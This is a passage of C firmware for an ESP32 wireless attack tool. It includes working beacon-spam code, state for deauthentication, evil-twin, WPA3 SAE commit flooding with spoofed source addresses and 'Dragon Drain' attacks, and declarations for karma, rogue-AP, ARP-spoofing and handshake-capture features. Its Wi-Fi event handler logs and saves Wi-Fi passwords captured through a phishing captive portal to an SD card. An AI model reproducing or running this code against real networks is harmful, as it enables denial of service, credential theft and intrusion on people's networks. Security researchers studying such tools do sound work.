    return pos;
}

/**
 * Send a beacon frame
 */
static void send_beacon_frame(const uint8_t *frame_buffer, int size) {
    if (!frame_buffer || size <= 0) {
        return;
    }

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
        vTaskDelay(pdMS_TO_TICKS(20));
        return;
    }
}

static esp_err_t wifi_apply_extended_country(void);
static void wifi_get_24ghz_channel_bounds(uint8_t *first_channel, uint8_t *last_channel);

/**
 * Beacon spam task - continuously sends beacon frames for configured SSIDs
 * Sends on all allowed 2.4 GHz channels with channel hopping
 */
static void beacon_spam_task(void *pvParameters) {
    (void)pvParameters;

    uint8_t first_channel = 1;
    uint8_t last_channel = 11;
    wifi_get_24ghz_channel_bounds(&first_channel, &last_channel);

    MY_LOG_INFO(TAG, "Beacon spam task started with %d SSIDs on channels %u-%u",
               beacon_ssid_count, first_channel, last_channel);
    
    // Static BSSID for all fake APs
    const uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    
    // Frame buffer
    uint8_t frame_buffer[256];
    
    while (beacon_spam_active && !operation_stop_requested) {
        // Iterate through all channels
        for (uint8_t current_channel = first_channel;
             current_channel <= last_channel && beacon_spam_active && !operation_stop_requested;
             current_channel++) {
            // Set WiFi channel
            esp_err_t err = esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
            if (err != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set channel %d: %s", current_channel, esp_err_to_name(err));
            }
            
            // Small delay to allow channel switch
            vTaskDelay(pdMS_TO_TICKS(10));
            
            // Send beacons for all SSIDs on this channel
            for (int i = 0; i < beacon_ssid_count && beacon_spam_active && !operation_stop_requested; i++) {
                // Build beacon frame for this SSID on current channel
                int frame_size = build_beacon_frame(frame_buffer, sizeof(frame_buffer), beacon_ssids[i], bssid, current_channel);
                
                if (frame_size > 0) {
                    // Send the beacon frame
                    send_beacon_frame(frame_buffer, frame_size);
                }
                
                {
                    static int64_t bcn_oled_last_us = 0;
                    int64_t bcn_now_us = esp_timer_get_time();
                    if (bcn_now_us - bcn_oled_last_us > 400000) {
                        bcn_oled_last_us = bcn_now_us;
                        char bcn_l2[64], bcn_l3[64], bcn_l4[64];
                        snprintf(bcn_l2, sizeof(bcn_l2), ">> %s", beacon_ssids[i]);
                        snprintf(bcn_l3, sizeof(bcn_l3), "  Ch %d/%d", current_channel, last_channel);
                        snprintf(bcn_l4, sizeof(bcn_l4), "  %d SSIDs TX", beacon_ssid_count);
                        oled_display_update_full("> Beacon Spam", bcn_l2, bcn_l3, bcn_l4);
                    }
                }
                
                // Fast delay between beacons (10ms for faster transmission)
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
    }
    
    MY_LOG_INFO(TAG, "Beacon spam task stopped");
    beacon_spam_active = false;
    beacon_spam_task_handle = NULL;
    vTaskDelete(NULL);
}


enum ApplicationState {
    DEAUTH,
    DEAUTH_EVIL_TWIN,
    EVIL_TWIN_PASS_CHECK,
    IDLE,
    DRAGON_DRAIN,
    SAE_OVERFLOW
};

volatile enum ApplicationState applicationState = IDLE;

static wifi_ap_record_t g_scan_results[MAX_AP_CNT];
static uint16_t g_scan_count = 0;
static volatile bool g_scan_in_progress = false;
static volatile bool g_scan_done = false;
static volatile uint32_t g_last_scan_status = 1; // 0 => success, non-zero => failure/unknown
static int64_t g_scan_start_time_us = 0;

static int g_selected_indices[MAX_AP_CNT];
static int g_selected_count = 0;

char * evilTwinSSID = NULL;
char * evilTwinPassword = NULL;
char * portalSSID = NULL;  // SSID for standalone portal mode
int connectAttemptCount = 0;
led_strip_handle_t strip;
static bool last_password_wrong = false;

typedef struct {
    uint8_t r;
    uint8_t g;
    uint8_t b;
} led_color_t;

#define LED_BRIGHTNESS_MIN        1U
#define LED_BRIGHTNESS_MAX        100U
#define LED_BRIGHTNESS_DEFAULT    5U

static const led_color_t LED_COLOR_IDLE = {0, 255, 0};

static led_color_t led_current_color = {0, 0, 0};
static bool led_initialized = false;
static bool led_user_enabled = true;
static uint8_t led_brightness_percent = LED_BRIGHTNESS_DEFAULT;

#define LED_NVS_NAMESPACE "ledcfg"
#define LED_NVS_KEY_ENABLED "enabled"
#define LED_NVS_KEY_LEVEL   "level"

static uint8_t led_scale_component(uint8_t value) {
    if (value == 0) {
        return 0;
    }
    uint32_t scaled = (uint32_t)value * led_brightness_percent + 99U;
    scaled /= 100U;
    if (scaled > 255U) {
        scaled = 255U;
    }
    return (uint8_t)scaled;
}

static esp_err_t led_commit_color(uint8_t r, uint8_t g, uint8_t b) {
    if (!led_initialized || strip == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    esp_err_t err;
    if (!led_user_enabled || (r == 0 && g == 0 && b == 0)) {
        err = led_strip_clear(strip);
    } else {
        err = led_strip_set_pixel(strip, 0, led_scale_component(r), led_scale_component(g), led_scale_component(b));
    }

    if (err == ESP_OK) {
        err = led_strip_refresh(strip);
    }
    return err;
}

static esp_err_t led_apply_current(void) {
    return led_commit_color(led_current_color.r, led_current_color.g, led_current_color.b);
}

static esp_err_t led_set_color(uint8_t r, uint8_t g, uint8_t b) {
    led_current_color = (led_color_t){r, g, b};
    return led_commit_color(r, g, b);
}

static esp_err_t led_clear(void) {
    led_current_color = (led_color_t){0, 0, 0};
    return led_commit_color(0, 0, 0);
}

static esp_err_t led_set_idle(void) {
    return led_set_color(LED_COLOR_IDLE.r, LED_COLOR_IDLE.g, LED_COLOR_IDLE.b);
}

static esp_err_t led_set_enabled(bool enabled) {
    led_user_enabled = enabled;
    if (!led_initialized) {
        return ESP_OK;
    }
    return led_apply_current();
}

static bool led_is_enabled(void) {
    return led_user_enabled;
}

static esp_err_t led_set_brightness(uint8_t percent) {
    if (percent < LED_BRIGHTNESS_MIN) {
        percent = LED_BRIGHTNESS_MIN;
    } else if (percent > LED_BRIGHTNESS_MAX) {
        percent = LED_BRIGHTNESS_MAX;
    }

    led_brightness_percent = percent;

    if (!led_initialized) {
        return ESP_OK;
    }

    if (!led_user_enabled) {
        return led_commit_color(0, 0, 0);
    }

    return led_apply_current();
}

static void led_persist_state(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(LED_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "LED config save open failed: %s", esp_err_to_name(err));
        return;
    }

    esp_err_t write_err = nvs_set_u8(handle, LED_NVS_KEY_ENABLED, led_user_enabled ? 1U : 0U);
    if (write_err == ESP_OK) {
        write_err = nvs_set_u8(handle, LED_NVS_KEY_LEVEL, led_brightness_percent);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_commit(handle);
    }

    nvs_close(handle);

    if (write_err != ESP_OK) {
        ESP_LOGW(TAG, "LED config save failed: %s", esp_err_to_name(write_err));
    }
}

static void led_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(LED_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "LED config load open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t enabled_value = 0;
    err = nvs_get_u8(handle, LED_NVS_KEY_ENABLED, &enabled_value);
    if (err == ESP_OK) {
        led_user_enabled = enabled_value != 0;
    } else if (err != ESP_ERR_NVS_NOT_FOUND) {
        ESP_LOGW(TAG, "LED enabled read failed: %s", esp_err_to_name(err));
    }

    uint8_t level_value = 0;
    err = nvs_get_u8(handle, LED_NVS_KEY_LEVEL, &level_value);
    if (err == ESP_OK) {
        if (level_value >= LED_BRIGHTNESS_MIN && level_value <= LED_BRIGHTNESS_MAX) {
            led_brightness_percent = level_value;
        } else {
            ESP_LOGW(TAG, "LED brightness %u out of range, keeping %u", level_value, led_brightness_percent);
        }
    } else if (err != ESP_ERR_NVS_NOT_FOUND) {
        ESP_LOGW(TAG, "LED brightness read failed: %s", esp_err_to_name(err));
    }

    nvs_close(handle);
}

static void led_boot_sequence(void) {
    led_current_color = (led_color_t){0, 0, 0};

    if (!led_initialized) {
        return;
    }

    if (!led_user_enabled) {
        (void)led_commit_color(0, 0, 0);
        return;
    }

    (void)led_commit_color(0, 0, 0);
    vTaskDelay(pdMS_TO_TICKS(50));
    (void)led_set_idle();
    vTaskDelay(pdMS_TO_TICKS(100));
}

// SD card HTML file management (allocated in PSRAM)
#define MAX_HTML_FILES 50
#define MAX_HTML_FILENAME 64
#define SD_PATH_MAX 192
static char (*sd_html_files)[MAX_HTML_FILENAME] = NULL;     // ~3.2 KB in PSRAM
static int sd_html_count = 0;
static char* custom_portal_html = NULL;
static bool sd_card_mounted = false;
static sdmmc_card_t *sd_card_handle = NULL;
#define MAX_SSID_PRESETS 64
#define MAX_SSID_NAME_LEN 32
#define SSID_PRESET_PATH "/sdcard/lab/ssid.txt"
#define SSIDS_FILE_PATH  "/sdcard/lab/ssids.txt"

// Whitelist for BSSID protection (allocated in PSRAM)
#define MAX_WHITELISTED_BSSIDS 150
typedef struct {
    uint8_t bssid[6];
} whitelisted_bssid_t;
static whitelisted_bssid_t *whiteListedBssids = NULL;       // ~0.9 KB in PSRAM
static int whitelistedBssidsCount = 0;

// ============================================================================
// PSRAM buffer initialization (must be after all pointer declarations)
// ============================================================================

static bool init_psram_buffers(void)
{
    sniffer_aps = heap_caps_calloc(MAX_SNIFFER_APS, sizeof(sniffer_ap_t), MALLOC_CAP_SPIRAM);
    probe_requests = heap_caps_calloc(MAX_PROBE_REQUESTS, sizeof(probe_request_t), MALLOC_CAP_SPIRAM);
    bt_found_devices = heap_caps_calloc(BT_INITIAL_CAPACITY, sizeof(*bt_found_devices), MALLOC_CAP_SPIRAM);
    bt_devices = heap_caps_calloc(BT_INITIAL_CAPACITY, sizeof(bt_device_info_t), MALLOC_CAP_SPIRAM);
    wardrive_scan_results = heap_caps_calloc(MAX_AP_CNT, sizeof(wifi_ap_record_t), MALLOC_CAP_SPIRAM);
    handshake_targets = heap_caps_calloc(MAX_AP_CNT, sizeof(wifi_ap_record_t), MALLOC_CAP_SPIRAM);
    sd_html_files = heap_caps_calloc(MAX_HTML_FILES, MAX_HTML_FILENAME, MALLOC_CAP_SPIRAM);
    target_bssids = heap_caps_calloc(MAX_TARGET_BSSIDS, sizeof(target_bssid_t), MALLOC_CAP_SPIRAM);
    whiteListedBssids = heap_caps_calloc(MAX_WHITELISTED_BSSIDS, sizeof(whitelisted_bssid_t), MALLOC_CAP_SPIRAM);
    selected_stations = heap_caps_calloc(MAX_SELECTED_STATIONS, sizeof(selected_station_t), MALLOC_CAP_SPIRAM);
    hs_ap_targets = heap_caps_calloc(HS_MAX_APS, sizeof(hs_ap_target_t), MALLOC_CAP_SPIRAM);
    hs_clients = heap_caps_calloc(HS_MAX_CLIENTS, sizeof(hs_client_entry_t), MALLOC_CAP_SPIRAM);
    ducb_channels = heap_caps_calloc(dual_band_channels_count, sizeof(ducb_channel_t), MALLOC_CAP_SPIRAM);
    wdp_seen_networks = heap_caps_calloc(WDP_INITIAL_CAPACITY, sizeof(wdp_network_t), MALLOC_CAP_SPIRAM);
    wdp_seen_capacity = WDP_INITIAL_CAPACITY;
    
    if (!sniffer_aps || !probe_requests || !bt_found_devices || !bt_devices || !wardrive_scan_results ||
        !handshake_targets || !sd_html_files || !target_bssids || !whiteListedBssids || !selected_stations ||
        !hs_ap_targets || !hs_clients || !ducb_channels || !wdp_seen_networks) {
        MY_LOG_INFO(TAG, "PSRAM allocation failed!");
        return false;
    }
    bt_found_device_capacity = BT_INITIAL_CAPACITY;
    bt_device_capacity = BT_INITIAL_CAPACITY;
    return true;
}

#define VENDOR_RECORD_SIZE 64
#define VENDOR_RECORD_NAME_BYTES (VENDOR_RECORD_SIZE - 4)
#define MAX_VENDOR_NAME_LEN (VENDOR_RECORD_NAME_BYTES + 1)
#define SD_OUI_BIN_PATH "/sdcard/lab/oui_wifi.bin"
#define VENDOR_NVS_NAMESPACE "vendorcfg"
#define VENDOR_NVS_KEY_ENABLED "enabled"
#define GPS_NVS_NAMESPACE "gpscfg"
#define GPS_NVS_KEY_MODULE "module"

// Boot button configuration (stored in NVS)
#define BOOTCFG_NVS_NAMESPACE "bootcfg"
#define BOOTCFG_KEY_SHORT_CMD  "short_cmd"
#define BOOTCFG_KEY_LONG_CMD   "long_cmd"
#define BOOTCFG_KEY_SHORT_EN   "short_en"
#define BOOTCFG_KEY_LONG_EN    "long_en"
#define BOOTCFG_CMD_MAX_LEN    192

typedef struct {
    char command[BOOTCFG_CMD_MAX_LEN];
} boot_action_params_t;

static const char* boot_allowed_commands[] = {
    "start_blackout",
    "start_sniffer_dog",
    "channel_view",
    "packet_monitor",
    "start_sniffer",
    "scan_networks",
    "start_gps_raw",
    "start_wardrive",
    "deauth_detector",
    "list_sd",
    "select_html",
    "start_portal"
};
static const size_t boot_allowed_command_count = sizeof(boot_allowed_commands) / sizeof(boot_allowed_commands[0]);

typedef enum {
    BOOT_FLOW_VALID = 0,
    BOOT_FLOW_INVALID_COMMAND,
    BOOT_FLOW_MALFORMED
} boot_flow_validation_result_t;

typedef struct {
    bool enabled;
    char command[BOOTCFG_CMD_MAX_LEN];
} boot_action_config_t;

typedef struct {
    boot_action_config_t short_press;
    boot_action_config_t long_press;
} boot_config_t;

static boot_config_t boot_config = {0};

static char vendor_lookup_buffer[MAX_VENDOR_NAME_LEN];
static bool vendor_file_checked = false;
static bool vendor_file_present = false;
static uint8_t vendor_last_oui[3] = {0};
static bool vendor_last_valid = false;
static bool vendor_last_hit = false;
static bool vendor_lookup_enabled = false;
static size_t vendor_record_count = 0;
static display_type_t display_forced_mode = DISPLAY_NONE; /* DISPLAY_NONE = auto */


// Methods forward declarations
static int cmd_scan_networks(int argc, char **argv);
static int cmd_show_scan_results(int argc, char **argv);
static int cmd_select_networks(int argc, char **argv);
static int cmd_unselect_networks(int argc, char **argv);
static int cmd_select_stations(int argc, char **argv);
static int cmd_unselect_stations(int argc, char **argv);
static int cmd_start_beacon_spam(int argc, char **argv);
static int cmd_start_evil_twin(int argc, char **argv);
static int cmd_start_handshake(int argc, char **argv);
static int cmd_save_handshake(int argc, char **argv);
static int cmd_start_gps_raw(int argc, char **argv);
static int cmd_gps_set(int argc, char **argv);
static int cmd_set_gps_position(int argc, char **argv);
static int cmd_set_gps_position_cap(int argc, char **argv);
static int cmd_start_wardrive(int argc, char **argv);
static int cmd_start_sniffer(int argc, char **argv);
static int cmd_start_sniffer_noscan(int argc, char **argv);
static int cmd_packet_monitor(int argc, char **argv);
static int cmd_channel_view(int argc, char **argv);
static int cmd_show_sniffer_results(int argc, char **argv);
static int cmd_clear_sniffer_results(int argc, char **argv);
static int cmd_show_sniffer_results_vendor(int argc, char **argv);
static int cmd_show_probes(int argc, char **argv);
static int cmd_list_probes(int argc, char **argv);
static int cmd_show_probes_vendor(int argc, char **argv);
static int cmd_list_probes_vendor(int argc, char **argv);
static int cmd_sniffer_debug(int argc, char **argv);
static int cmd_start_blackout(int argc, char **argv);
static int cmd_ping(int argc, char **argv);
static int cmd_boot_button(int argc, char **argv);
static int cmd_start_portal(int argc, char **argv);
static int cmd_start_rogueap(int argc, char **argv);
static int cmd_start_karma(int argc, char **argv);
static int cmd_list_sd(int argc, char **argv);
static int cmd_list_dir(int argc, char **argv);
static int cmd_list_ssid(int argc, char **argv);
static int cmd_list_ssids(int argc, char **argv);
static int cmd_add_ssid(int argc, char **argv);
static int cmd_remove_ssid(int argc, char **argv);
static int cmd_start_beacon_spam_ssids(int argc, char **argv);
static int start_beacon_spam_internal(void);
static int cmd_select_html(int argc, char **argv);
static int cmd_show_pass(int argc, char **argv);
static int cmd_file_delete(int argc, char **argv);
static int cmd_start_pcap(int argc, char **argv);
static int cmd_stop(int argc, char **argv);
static int cmd_wifi_connect(int argc, char **argv);
static int cmd_list_hosts(int argc, char **argv);
static int cmd_list_hosts_vendor(int argc, char **argv);
static int cmd_start_nmap(int argc, char **argv);
static int cmd_arp_ban(int argc, char **argv);
static void arp_ban_task(void *pvParameters);
static int cmd_reboot(int argc, char **argv);
static int cmd_led(int argc, char **argv);
static int cmd_vendor(int argc, char **argv);
static int cmd_display(int argc, char **argv);
static int cmd_download(int argc, char **argv);
static int cmd_wpasec_key(int argc, char **argv);
static int cmd_wpasec_upload(int argc, char **argv);
static int cmd_wigle_key(int argc, char **argv);
static int cmd_wigle_upload(int argc, char **argv);
static int cmd_wdgwars_key(int argc, char **argv);
static int cmd_wdgwars_upload(int argc, char **argv);
static int cmd_channel_time(int argc, char **argv);
static int cmd_ota_check(int argc, char **argv);
static int cmd_ota_list(int argc, char **argv);
static int cmd_ota_channel(int argc, char **argv);
static int cmd_ota_info(int argc, char **argv);
static int cmd_ota_boot(int argc, char **argv);
static esp_err_t start_background_scan(uint32_t min_time, uint32_t max_time);
static void print_scan_results(void);
static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
// Target BSSID management functions
static void save_target_bssids(void);
static esp_err_t quick_channel_scan(void);
static bool check_channel_changes(void);
static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count);
// Attack task forward declarations
static void deauth_attack_task(void *pvParameters);
static void blackout_attack_task(void *pvParameters);
static void sae_attack_task(void *pvParameters);
static void handshake_attack_task(void *pvParameters);
static void handshake_attack_task_selected(void);
static void handshake_attack_task_sniffer(void);
static void beacon_spam_task(void *pvParameters);
static bool check_handshake_file_exists(const char *ssid);
static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid);
static void handshake_cleanup(void);
static void attack_network_with_burst(const wifi_ap_record_t *ap);
static const char *display_mode_to_str(display_type_t mode);
static bool display_mode_from_str(const char *s, display_type_t *out_mode);
static void display_mode_load_from_nvs(void);
static void display_mode_save_to_nvs(display_type_t mode);
// D-UCB and sniffer handshake helpers
static void ducb_init(void);
static int ducb_select_channel(void);
static void ducb_update(int channel_idx, double reward);
static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel);
static bool hs_save_handshake_to_sd(int ap_idx);
static void gps_raw_task(void *pvParameters);
// Wardrive promisc helpers
static void wdp_ducb_init(void);
static int wdp_ducb_select_channel(void);
static void wdp_ducb_update(int channel_idx, double reward);
static int wdp_get_dwell_ms(wdp_channel_tier_t tier);
static void wdp_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void wardrive_promisc_task(void *pvParameters);
static int cmd_start_wardrive_promisc(int argc, char **argv);
static int cmd_start_wardrive_promisc_trace(int argc, char **argv);
static int cmd_start_wardrive_promisc_impl(int argc, char **argv, bool trace_enabled);
// DNS server task
static void dns_server_task(void *pvParameters);
// Portal HTTP handlers
static esp_err_t root_handler(httpd_req_t *req);
static esp_err_t portal_handler(httpd_req_t *req);
static esp_err_t login_handler(httpd_req_t *req);
static esp_err_t get_handler(httpd_req_t *req);
static esp_err_t save_handler(httpd_req_t *req);
static esp_err_t android_captive_handler(httpd_req_t *req);
static esp_err_t ios_captive_handler(httpd_req_t *req);
static esp_err_t captive_detection_handler(httpd_req_t *req);
// Sniffer functions
static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void sniffer_process_scan_results(void);
static void sniffer_merge_scan_results(void);
static void sniffer_init_selected_networks(void);
static void sniffer_channel_hop(void);
static void channel_view_task(void *pvParameters);
static void channel_view_stop(void);
static void channel_view_publish_counts(void);
// Packet monitor functions
static void packet_monitor_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void packet_monitor_task(void *pvParameters);
static void packet_monitor_shutdown(void);
static void packet_monitor_stop(void);
// Sniffer Dog functions
static int cmd_start_sniffer_dog(int argc, char **argv);
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void sniffer_dog_task(void *pvParameters);
static void sniffer_dog_channel_hop(void);
static void sniffer_channel_task(void *pvParameters);
static bool is_multicast_mac(const uint8_t *mac);
// Deauth detector functions
static int cmd_deauth_detector(int argc, char **argv);
static void deauth_detector_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void deauth_detector_task(void *pvParameters);
static void deauth_detector_channel_hop(void);
// BLE scanner functions (NimBLE)
static int cmd_scan_bt(int argc, char **argv);
static int cmd_scan_airtag(int argc, char **argv);
static void bt_scan_stop(void);
static void bt_scan_task(void *pvParameters);
static void bt_airtag_scan_task(void *pvParameters);
static bool is_broadcast_bssid(const uint8_t *bssid);
static bool is_own_device_mac(const uint8_t *mac);
static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi);
// Wardrive functions
static esp_err_t init_gps_uart(int baud_rate);
static int gps_get_baud_for_module(gps_module_t module);
static const char *gps_get_module_name(gps_module_t module);
static bool gps_module_uses_external_feed(gps_module_t module);
static bool gps_module_uses_external_cap_feed(gps_module_t module);
static const char *gps_external_position_command_name(gps_module_t module);
static void gps_sync_from_selected_external_source(void);
static void gps_load_state_from_nvs(void);
static void gps_save_state_to_nvs(void);
static esp_err_t init_sd_card(void);
static esp_err_t create_sd_directories(void);
static void sd_sync(void);
static void safe_restart(void);
static bool parse_gps_nmea(const char* nmea_sentence);
static void get_timestamp_string(char* buffer, size_t size);
static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
static bool wait_for_gps_fix(int timeout_seconds);
static int find_next_wardrive_file_number(void);
// PCAP capture functions
static int find_next_pcap_file_number(void);
static void pcap_radio_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void pcap_enqueue_frame(const uint8_t *data, uint16_t len);
static void pcap_writer_task(void *param);
static err_t pcap_netif_input_hook(struct pbuf *p, struct netif *inp);
static err_t pcap_netif_linkoutput_hook(struct netif *netif, struct pbuf *p);
static void pcap_arp_spoof_task(void *param);

static bool wigle_split_key_pair(const char *input,
                                 char *api_name,
                                 size_t api_name_sz,
                                 char *api_token,
                                 size_t api_token_sz);
// Portal data logging functions
static void save_evil_twin_password(const char* ssid, const char* password);
static void save_portal_data(const char* ssid, const char* form_data);
// Whitelist functions
static void load_whitelist_from_sd(void);
static bool is_bssid_whitelisted(const uint8_t *bssid);
// SAE WPA3 attack methods forward declarations:
//add methods declarations below:
static void inject_sae_commit_frame();
static void prepareAttack(const wifi_ap_record_t ap_record);
static void update_spoofed_src_random(void);
static int crypto_init(void);
static int trng_random_callback(void *ctx, unsigned char *output, size_t len);
void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type);
static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt);

//add variables declarations below:
//SAE properties:
static int frame_count = 0;
static int64_t start_time = 0;

#define NUM_CLIENTS 20


/* --- mbedTLS Crypto --- */
static mbedtls_ecp_group ecc_group;      // grupa ECC (secp256r1)
static mbedtls_ecp_point ecc_element;      // bieżący element (punkt ECC)
static mbedtls_mpi ecc_scalar;             // bieżący skalar
static mbedtls_ctr_drbg_context ctr_drbg; 
static mbedtls_entropy_context entropy;

/* Router BSSID */
static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};

char * anti_clogging_token = NULL; // Anti-Clogging Token, if any
int actLength = 0; // Length of the Anti-Clogging Token

/* Spoofing base address. Each frame modifies last byte of the address to create a unique source address.*/
static const uint8_t base_srcaddr[6] = { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 };

static uint8_t spoofed_src[6];  // really spoofed source address
static int next_src = 0;        // spoofing index


static const uint8_t auth_req_sae_commit_header[] = {
    0xb0, 0x00, 0x00, 0x00,                   // Frame Control & Duration
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 1 (BSSID – placeholder)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // Address 2 (Source – placeholder)
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 3 (BSSID – placeholder)
    0x00, 0x00,                               // Sequence Control
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00  // SAE Commit fixed part
};

#define AUTH_REQ_SAE_COMMIT_HEADER_SIZE (sizeof(auth_req_sae_commit_header))


int framesPerSecond = 0;

// END of SAE properties








static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data);
static void ip_event_handler(void *event_handler_arg,
                             esp_event_base_t event_base,
                             int32_t event_id,
                             void *event_data);
static void ota_check_task(void *pvParameters);
static esp_err_t ota_fetch_latest_release(char *url_out, size_t url_len,
                                          char *tag_out, size_t tag_len);
static esp_err_t ota_fetch_release_by_tag(const char *tag,
                                          char *url_out, size_t url_len,
                                          char *tag_out, size_t tag_len);
static esp_err_t ota_build_branch_url(char *url_out, size_t url_len);
static bool ota_is_newer_version(const char *current, const char *latest);
static bool ota_has_ip(void);
static bool ota_is_connected(void);
static bool ota_start_check(const char *tag, bool force_latest);
static void ota_load_channel_from_nvs(void);
static bool ota_save_channel_to_nvs(const char *channel);
static void ota_mark_valid_if_pending(void);
static void ota_log_boot_info(void);
static void ota_led_start(void);
static void ota_led_stop(void);

static esp_err_t wifi_init_ap_sta(void);
static esp_err_t bt_nimble_init(void);
static void bt_nimble_deinit(void);
static void bt_reset_counters(void);
static void bt_format_addr(const uint8_t *addr, char *str);
static int bt_start_scan(void);
static int bt_start_scan_coex(void);
static void bt_stop_scan(void);
static int wigle_wifi_channel_to_frequency_mhz(int channel);
static double gps_distance_meters(double lat1, double lon1, double lat2, double lon2);
static bool wardrive_trace_init_file(const char *path);
static bool wardrive_trace_append_point(const char *path, double lat, double lon, double alt);
static void wardrive_trace_finalize_file(const char *path);
static void register_commands(void);

// --- Wi-Fi event handler ---
static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data) {
    if (event_base == WIFI_EVENT) {
        //MY_LOG_INFO(TAG, "WiFi event: %ld", event_id);
        switch (event_id) {
        case WIFI_EVENT_STA_CONNECTED: {
            const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
            ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                     (const char*)e->ssid, e->channel,
                     e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
            
            if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
                MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
            } else {
                MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s'", (const char*)e->ssid);
            }
            
            // Signal wifi_connect command that connection succeeded
            wifi_connect_result = 1;
            
            // Mark password as correct
            last_password_wrong = false;
            
            // If portal is active (Evil Twin attack), shut it down after successful connection
            if (portal_active) {
                MY_LOG_INFO(TAG, "Password verified! Shutting down Evil Twin portal...");
                oled_display_update_full("> Evil Twin", "  PASSWORD OK!", "  Saving to SD", "  >> Success!");
                portal_active = false;
                
                // Stop DNS server task
                if (dns_server_task_handle != NULL) {
                    // Wait for DNS task to finish (it checks portal_active flag)
                    for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
                        vTaskDelay(pdMS_TO_TICKS(100));
                    }
                    
                    // Force cleanup if still running
                    if (dns_server_task_handle != NULL) {
                        vTaskDelete(dns_server_task_handle);
                        dns_server_task_handle = NULL;
                        if (dns_server_socket >= 0) {
                            close(dns_server_socket);
                            dns_server_socket = -1;
                        }
                    }
                }
                
                // Stop HTTP server
                if (portal_server != NULL) {
                    httpd_stop(portal_server);
                    portal_server = NULL;
                    MY_LOG_INFO(TAG, "HTTP server stopped.");
                }
                
                // Stop DHCP server
                esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
                if (ap_netif) {
                    esp_netif_dhcps_stop(ap_netif);
                }
                
                // Change WiFi mode from APSTA to STA only (disable AP)
                esp_err_t mode_ret = esp_wifi_set_mode(WIFI_MODE_STA);
                if (mode_ret == ESP_OK) {
                    MY_LOG_INFO(TAG, "WiFi mode changed to STA only - AP disabled.");
                } else {
                    MY_LOG_INFO(TAG, "Failed to change WiFi mode: %s", esp_err_to_name(mode_ret));
                }
                
                MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
                
                // Small delay to ensure all resources are properly released
                vTaskDelay(pdMS_TO_TICKS(500));
                
                // Now save verified password to SD card (after portal is fully closed)
                if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
                    MY_LOG_INFO(TAG, "Saving verified password to SD card...");
                    save_evil_twin_password(evilTwinSSID, evilTwinPassword);
                }
            }
            
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_AP_STACONNECTED: {
            const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
            MY_LOG_INFO(TAG, "AP: Client connected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
            
            // Increment connected clients counter
            portal_connected_clients++;
            MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
            
            // OLED update for portal/karma/rogueap client connect (not evil twin - that's handled in deauth task)
            if (portal_active && !evilTwinSSID) {
                const char *mode_name = karma_mode_active ? "> Karma Attack" :
                                        rogueap_mode_active ? "> Rogue AP" : "> Captive Portal";
                char p_l4[64];
                snprintf(p_l4, sizeof(p_l4), "  Clients: %d", portal_connected_clients);
                oled_display_update_full(mode_name, portalSSID ? portalSSID : "", "  Client joined!", p_l4);
            }
            
            // During evil twin attack, switch to first selected network's channel
